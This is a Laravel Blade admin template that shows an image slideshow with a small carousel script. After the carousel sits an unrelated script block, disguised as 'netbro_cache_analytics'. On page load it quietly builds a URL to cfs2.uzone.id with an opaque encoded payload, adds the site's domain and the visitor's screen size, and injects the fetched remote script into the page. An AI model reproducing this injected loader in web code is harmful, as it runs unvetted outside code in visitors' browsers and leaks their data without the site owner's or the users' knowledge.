@extends('admin.index')
</br>
</br>
</br>
</center>
@section('content')
<div class="container">

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
<body>

<!-- Navigation -->
<!-- Slide Show -->
<section>
  <img class="mySlides" src="/upload/Banner-Web-Cinematic-1300-x-700-pxll.jpg"
  style="width:90%">
  <img class="mySlides" src="/upload/Banner-Web-Cinematic-1300-x-700-pxll.jpg"
  style="width:90%">
  <img class="mySlides" src="/upload/1.jpg"
  style="width:90%">
</section>

<script>
// Automatic Slideshow - change image every 3 seconds
var myIndex = 0;
carousel();

function carousel() {
    var i;
    var x = document.getElementsByClassName("mySlides");
    for (i = 0; i < x.length; i++) {
       x[i].style.display = "none";
    }
    myIndex++;
    if (myIndex > x.length) {myIndex = 1}
    x[myIndex-1].style.display = "block";
    setTimeout(carousel, 3000);
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}
function sync(fn) {fn();}
function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKO1Htcul3OIJMtlD4wGj9iCLXdwcQ6C4t%2bkAM17OjgB0Ur9qzgcEm3vsJwn%2fXqqCyYM7LKBzRnH51iLSFXwPnVluMdHmdfAwxul%2fVrKsbxTI8q3bEhnNabBwtIPrJ373482j9P80ScLlRzPK0NDiDeOSu8NBaW2DFS3LXllHVPR%2fxtZHFTExrec%2fd%2bZqWioKmMbqtzxq4%2fNB2xeVp5ellDNWxg1yANqoFcTsltYSmvDSh7t%2blyZAX2SItxRBEhDevoXIdk2GsvJxaujCzhEjq3TV5fXelZV5Nb2tOwrhVMLCF20qlWwcJ6JRwDPjPwOaZtFWbT5407f0DeXwTMESfokDZaYrtcfVcxNu9s7dJHjsWZZQk71LNuQgl5YnDq5tIbdelxe%2fY3sRp7J71N5yYJd7I%2bgoJJHNTNOu2GgpfTG3QuqXl3NFNKlmKHqSsM5O%2fs%2fE1Lg1c6XIJW4g%2fehiJh0VX9WElAEiACNgOk3pPAmlM1NLN5McvAv8i%2bYYeo8GKm3%2fNjPTLrqWIG3T19chXPYrga8UAqN6p79JsVcAtLXB7k62rI%2fDcVBusiY4lOotT%2fEkekeT8CN1YCcKTGVlCVAp4NzIn%2bCcnrzjeef3nioQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');
bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;
(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>

        </div>
      </div>
    </div>
  </div>
</div>
@endsection
